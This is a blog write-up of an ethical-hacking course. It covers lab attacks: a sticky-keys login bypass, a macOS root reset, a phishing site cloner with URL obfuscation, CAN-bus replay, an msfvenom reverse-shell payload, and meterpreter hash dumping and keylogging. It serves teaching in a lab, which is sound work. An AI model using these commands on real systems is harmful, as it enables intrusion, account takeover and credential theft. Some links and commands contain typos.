---
title: "Ethical hacking course"
author: Ludovic COULON
date: 2020-03-11
hero: ./images/hero.jpeg
excerpt: "Ethical hacking course"
---

## Write up base on the course -> https://www.udemy.com/course/real-world-ethical-hacking/

First, what is a ethical hacker ? That's sounds wierd but is a greate question to ask.

Testing systems for weaknesses with explicit permission of the ower.

- Recommending and or applying fixes and improvements to secure the app/network.

**The security triad**

- **Confidentialty** **:** Information is protected from unauthorized access
- **Integrity :** Information is protected from unauthorized modification
- **Availability** **:** Timely access to information (by authorized people) is ensured

**Attackers**

**Outsiders :**

- Competitors (different compagny for exemple)
- Black hat / Gray hat hackers
- Origanized crime
- Terrorists
- Foreign government, military and others

**Insiders** **:**

- Customers, suppliers, vendors, or business partners
- Disgruntled current or former employees
- Contractors, temps or consultants

**How do we protect ?**

- **Prevention** - techniques that cause attacks to fail
- **Detection** - techniques that determine that an attack is under way or, has occurred and report it
- **Recovery** - techniques that stop attackers and assess and reparis any damaged caused

Hands-on : Reset the password and create an administrator user on any windows computer

Use f2/DEL/f12 to boot from Windows install disk.
Click **Troubleshoot**. Click **Command Prompt**.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c2983e40-36be-4ab5-806e-5d223be3bc13/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c2983e40-36be-4ab5-806e-5d223be3bc13/Untitled.png)

Click on repair your computer for the windows 10 iso for exemple

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eb515b06-4f36-45e3-b74e-5aa189d42d8c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/eb515b06-4f36-45e3-b74e-5aa189d42d8c/Untitled.png)

Then troubleshoot

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f63a2359-8fd8-4a42-a4d5-2b90bd2e07f1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f63a2359-8fd8-4a42-a4d5-2b90bd2e07f1/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/338dfae4-924b-464a-9a6a-314f58fc7b89/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/338dfae4-924b-464a-9a6a-314f58fc7b89/Untitled.png)

Then finally command prompt

In the CMD window, type these commands:
**cd c:\windows\system32\
 copy sethc.exe sethc_old.exe
copy cmd.exe sethc.exe**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6e99c50-ef63-43c3-a438-711a54488e45/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6e99c50-ef63-43c3-a438-711a54488e45/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/394a4e8c-2db3-4395-9963-885de257059f/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/394a4e8c-2db3-4395-9963-885de257059f/Untitled.png)

Now instead of having this popup for the shifts key you will have a command prompt !

Restart computer. At the login screen where you enter your
password, press the **Shift** key five times. CMD window appears.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0bde7f13-58bc-46d9-85e5-1b48d00c1545/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0bde7f13-58bc-46d9-85e5-1b48d00c1545/Untitled.png)

To change your existing password, type:
**net user [ironman][jarvis]**
To add a new user and promote to Administrator:

**net user [ironman][jarvis] /add
net localgroup administrators ironman /add**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c7b4b238-27d2-4f07-84b0-ca074c2720ef/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c7b4b238-27d2-4f07-84b0-ca074c2720ef/Untitled.png)

**If you want to protect your computer for this attack please do this :**

Nerver leave your computer unattended
Change your BIOS settings to require a password to change the boot order or the boot device.

Hands-on : Exact same thing but this time with macOS

• On the login prompt press (**Command+S**)

• At the Terminal, type **clear** to clear the screen, then:

**/sbin/fsck –fy
/sbin/mount -uw /
launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3cde2b42-3fd7-47e0-b93a-a1d20afae758/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3cde2b42-3fd7-47e0-b93a-a1d20afae758/Untitled.png)

**passwd**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/478ff7ca-dcb9-4932-892e-b2fa428277a4/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/478ff7ca-dcb9-4932-892e-b2fa428277a4/Untitled.png)

• Enter a new ‘root’ password, twice
**exit**

• Log in as **root** using the new password

**Helpful Linux Terminal Commands:**

- **ls [list, ls -al ]**
- **cd [chang dir, cd .. ]**
- **uname -a [OS info]**
- **history [also up arrow]**
- **sudo [super user do]**
- **mkdir/rmdir [create dir]**
- **cp/mv/rm [copy/move/del files]**
- **man [help or cmd --help]**
- **pwd [print working dir]**
- **echo [print to screen, > to file]**
- **nano [text editor, CTRL‐X]**
- **more [show contents of file]**
- **find -name [find file by name]**
- **locate [locate after updatedb]**
- **ping/ifconfig [network]**
- **env [show all environment vars]**

**Helpful Windows Commands:**

- **dir [list files in directory]**
- **cd [chang dir, cd .. ]**
- **ver [OS info]doskey /h [also up arrow]**
- **sudo [run cmd as administrator]**
- **mkdir/rmdir [also md/rd]**
- **copy/move/del [copy files]**
- **help [help or cmd /?]**
- **cd [print current dir]**
- **echo [print to screen, > to file]**
- **notepad [text editor]**
- **more [show contents of file]**
- **find [no exact equivalent]**
- **ping [ping an address/host]**
- **ipconfig [network info]**
- **set [show all environment vars]**

Lab for my pentest (Windows 10, Windows 7, Kali, MacOS, Metasploit2VM)

**Metasploit commands :**

- msfadmin:msfadmin
- (**root**) > rlogin -l root **[IP]**

**Windows 10 commands :**

- root:toor

**Windows 7 commands :**

- root:toor

**Kali commands :**

- root:toor

Network for the lab (private host)

**10.0.3.X / 255.255.255.0**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f24162d1-f9fe-4abb-b148-ca60ef85bb72/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f24162d1-f9fe-4abb-b148-ca60ef85bb72/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2bb1ae9e-5edf-44c7-9315-f61bea2e9c9d/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2bb1ae9e-5edf-44c7-9315-f61bea2e9c9d/Untitled.png)

Now our second network adapter for update the VM/Kali

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b11ebbdd-532b-42b4-8739-9beaacbf36d1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b11ebbdd-532b-42b4-8739-9beaacbf36d1/Untitled.png)

**Social engineering attack**

- **Phishing attack**
- **Pretexting** (Like i'm pretending to be your dad and i want some money #leboncoin)
- **Baiting** (USB drive on a bus)
- **Quid pro quo** (If you help me with this, i'll send you some money)
- **Tailgating** (Follow someone to gain access to bulding)
- **Vishing** (Voice form of phishing - pretending to be your bank for exemple)
- **Spear-phishing** (Customise a phishing mail with specific informations)

**Fist attack : Site cloner with credentials stealing**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af877120-f11a-4f6f-b4df-b2244469892c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af877120-f11a-4f6f-b4df-b2244469892c/Untitled.png)

Fist launch SET

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d8226f57-669b-4852-8e8a-26ad133c77b1/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d8226f57-669b-4852-8e8a-26ad133c77b1/Untitled.png)

- Type 1 for the social engineering attack

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5c4fe0c9-d65d-4b81-94cc-3d301c15be59/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5c4fe0c9-d65d-4b81-94cc-3d301c15be59/Untitled.png)

- Type 2 for the website attack

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d3fe2b0d-1b9a-4566-86eb-4324200cba02/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d3fe2b0d-1b9a-4566-86eb-4324200cba02/Untitled.png)

- Then select the third for the credentials haverster attack method

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e7e183ee-e75d-42a5-ad29-b1c89909f3f9/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e7e183ee-e75d-42a5-ad29-b1c89909f3f9/Untitled.png)

- Select the site cloner for the perfect illusion

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8cbf191d-f0c9-4e13-bcf2-c4f04473481e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8cbf191d-f0c9-4e13-bcf2-c4f04473481e/Untitled.png)

- Now enter you local IP of your computer of what ever you may need

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/52f36e77-544b-4edf-bf99-c33bf8305356/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/52f36e77-544b-4edf-bf99-c33bf8305356/Untitled.png)

- Enter the website that you want to replicate

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/364e633e-2a28-4ae9-af4e-e795c9f029cb/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/364e633e-2a28-4ae9-af4e-e795c9f029cb/Untitled.png)

- And its done ! you just need to wait now.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/77ed91fb-e3b1-4b93-8835-a6666ba3412c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/77ed91fb-e3b1-4b93-8835-a6666ba3412c/Untitled.png)

- Once you are done with this you can close the program and it will generate a report

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/559af47c-2804-4056-91ad-1db808bc18a9/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/559af47c-2804-4056-91ad-1db808bc18a9/Untitled.png)

You can see the email and pass !

> **Now we are gonna change the url of the payload**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/11d546c2-6cb4-4ac2-9c45-86a8e8d07f1a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/11d546c2-6cb4-4ac2-9c45-86a8e8d07f1a/Untitled.png)

If we go to our windows 10 VM and we type the IP of the Kali VM you can see the payload, the payload with this address is not very effective this way.

If we convert our payload IP (Kali VM) into decimal we have this result : 167774592

And if we type this in the url (http://167774592)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a10ec545-6917-4e76-83cf-2a675374080f/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a10ec545-6917-4e76-83cf-2a675374080f/Untitled.png)

It redirect in our payload address

> **For even more obfuscation you can use this : http://facebook.com@167774592**

**Second attack : Car hacking (in a VM because i don't have a car :/)**

To do this hack we need to install **some depedencies** :

- **sudo apt-get install libsdl2-dev**
- **sudo apt-get install libsdl2-image-dev**

Install the **can-utils** :

- **sudo apt-get install can-utils**

Now you can download the **ICSim tools** in github

- **cd ~**
- **git clone https://gtihub.com/zombieCraig/ICSim.git**

**End result**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/863ddb1d-bc8a-4233-9c97-fdda75f5f194/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/863ddb1d-bc8a-4233-9c97-fdda75f5f194/Untitled.png)

1. **Start the virtual CAN network :**
   - modprobe vcan
   - dmseg (to see the error log)
   - ip link add dev vcan0 type vcan
   - ip link set up vcan0
2. **Run cansniffer :**
   - cansniffer -c vcan0
3. **Open a new terminal windows and type :**
   - cd Desktop/ICSim
   - ./icsim vcan0
4. **And lastly open a new terminal window and type :**

cd Desktop/ICSim
./controls vcan0

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7cbdacf1-11c0-4d33-8e30-aebffc4f5e35/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7cbdacf1-11c0-4d33-8e30-aebffc4f5e35/Untitled.png)

You can close, accelerate, open door everything.

**Car replay attack**

**While running the ICSim :**

- Start the candump packet capture tool
  - candump -l vcan0
  - Now you can mess up with the controls (accelerate, door open, close)

**Now switch back to the candump terminal window and stop the capture with CTRL-C**

- ls
- [candump-file].log

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/281093ac-54cd-47aa-81a8-d0309f4a2812/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c281093ac-54cd-47aa-81a8-d0309f4a2812/Untitled.png)

**And now you can use this attack with :**

- canplayer -I [candump-file].log vcan0

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fe3bb8e2-3609-4fe4-b572-53e66c56ce8c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.cfe3bb8e2-3609-4fe4-b572-53e66c56ce8c/Untitled.png)

- [https://www.swisstransfer.com/d/cc1dccf6-9eb0-4704-b6a2-f41b4927070b](https://www.swisstransfer.com/d/cc1dccf6-9eb0-4704-b6a2-f41b4927070b) (proof of concept)

**Third attack : Getting root in a windows 7 machine with metasploit**

1. **First launch metasploit**

- **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.3.3 -f exe -o /root/Desktop/Unityx64**
  - **-p is for the payload**
  - **LHOST is the ip address of the attacker machine (Kali in this case)**
  - **-f is for the file extension (exe)**
  - **-o is for the output where the file is going to be created with the name of course.**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/be44e10d-2569-4d1d-a1ac-280865385dc4/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.cbe44e10d-2569-4d1d-a1ac-280865385dc4/Untitled.png)

- **Now copy the payload on the var/www/ repertory**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e95b572e-e39e-45e8-977a-e2f1df5705df/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.ce95b572e-e39e-45e8-977a-e2f1df5705df/Untitled.png)

- Then add privilège with the following command :

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/637de89c-21d5-4caa-9056-6266a8c620c2/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c637de89c-21d5-4caa-9056-6266a8c620c2/Untitled.png)

- Finally you can start the apache service with :

**Now you can go to your windows 7 machine and type the ip of the attacker machine in your brower**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6f9efdf0-e6bd-4e6a-b250-f72eba8e5c43/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c6f9efdf0-e6bd-4e6a-b250-f72eba8e5c43/Untitled.png)

**Now go back to the msf console and type the following commands :**

- **use exploit/multi/handler**

**exploit -g -z**

- **Now you can donwload and execute the infected file on the windows 7 machine.**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cb58630b-b1cc-40cd-83a7-eb9b07b26083/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.ccb58630b-b1cc-40cd-83a7-eb9b07b26083/Untitled.png)

Click on the check box if you can't download the exe

**If everything is correct you will see this**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/29973504-e373-4ab7-863a-d65013a81af2/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c29973504-e373-4ab7-863a-d65013a81af2/Untitled.png)

**Now the spicy part, exploit the victim with meterpreter**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/650fd4d0-53eb-49ab-87a3-2265d7a34a4f/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c650fd4d0-53eb-49ab-87a3-2265d7a34a4f/Untitled.png)

- First, create a session with the victim computer with :

**You can run the following command to optain the hash and the username of the machine**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fd8ad56b-540a-4d90-b735-b266411f053e/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.cfd8ad56b-540a-4d90-b735-b266411f053e/Untitled.png)

- **getuid > optain the user of the session**
- **run hashdump > optain the password hash of the user**

**You can see the image, the user that we infect is not an administrator user, so we need to elevate privileges.**

**Elevate privileges on windows 7**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b25d5238-2d21-46ac-a701-baf2168d0e9c/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.cb25d5238-2d21-46ac-a701-baf2168d0e9c/Untitled.png)

- First, you can type "**background**" to go back to the msf5 console then :

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0063f5b2-df22-4a6b-9b88-0f8ac5e8e0b9/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c0063f5b2-df22-4a6b-9b88-0f8ac5e8e0b9/Untitled.png)

- **set payload windows/meterpreter/reverse_tcp**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c433b932-bf55-408a-8c93-0511b39248f0/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.cc433b932-bf55-408a-8c93-0511b39248f0/Untitled.png)

**You are now successfully administrator of the victim pc**

**Forth attack : create a payload to infect an windows 10 machine**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/395dd58c-0ffc-4de7-b936-710692ca2d21/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c395dd58c-0ffc-4de7-b936-710692ca2d21/Untitled.png)

Same ad before, you need to copy this exe file to you var/www/shared folder

and of course use chmod to change the privilege.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b39a6b92-dd66-49c8-a39d-c94e100b4c03/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.cb39a6b92-dd66-49c8-a39d-c94e100b4c03/Untitled.png)

- **use exploit/multi/handler**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6ea9c3b6-10a5-4405-a4c3-34e132be0b94/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c6ea9c3b6-10a5-4405-a4c3-34e132be0b94/Untitled.png)

Now you can open the exe file on your windows 10 machine and voila ! you have a session open with the infected machine.

**Take a screenshot with meterpreter**

- screenshot

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/019386f8-aec9-4979-a2bc-d485fa037e20/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c019386f8-aec9-4979-a2bc-d485fa037e20/Untitled.png)

Scan the keystrokes on a windows machine

- keyscan_start
- keyscan_dump

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6fee470c-56a9-4d44-88a8-b3202c8727e5/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.c6fee470c-56a9-4d44-88a8-b3202c8727e5/Untitled.png)

**Problems with password**

- **Social engineering** (Phishing for exemple)
- **Snacking** : Look on your friend desk and find a post-it
- **Hacking**: Physical accesss can overwrite password (touches remanentes remplacé avec le CMD par exemple)
- **Hijicking** : Reveal password stored in browser (mozilla, chrome, other...)
- **Sniffing** : Use wireshark and some other tools to scan the network for password or usernames for exemple
- **Cracking** : Use hash dump and crack the password with a worldlist is a create exemple

**Fith attack : Hijiack password from mozilla**

**If you have for exemple access to a machine with a website open and a login prompt, go to saved password and if there is already a password go to inspect element and on the input type="password" replathe password with "text" to see the password in plain text.**
